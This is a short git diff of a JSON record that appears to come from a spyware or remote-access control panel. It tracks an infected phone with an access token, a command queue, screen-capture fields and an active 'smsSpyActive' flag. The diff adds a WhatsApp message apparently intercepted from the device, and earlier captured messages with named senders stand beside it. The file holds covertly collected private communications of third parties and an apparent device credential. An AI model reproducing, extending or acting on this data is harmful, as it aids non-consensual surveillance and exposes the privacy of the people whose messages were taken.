@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776782346315,
+    "lastSeen": 1776782349377,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "nopal cmpk",
+        "content": "sender?",
+        "time": "21/04 21:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782349725
+      },
       {
         "appName": "WhatsApp",
         "sender": "7.4 cowo cowo kaciw: Rapli 7.4",
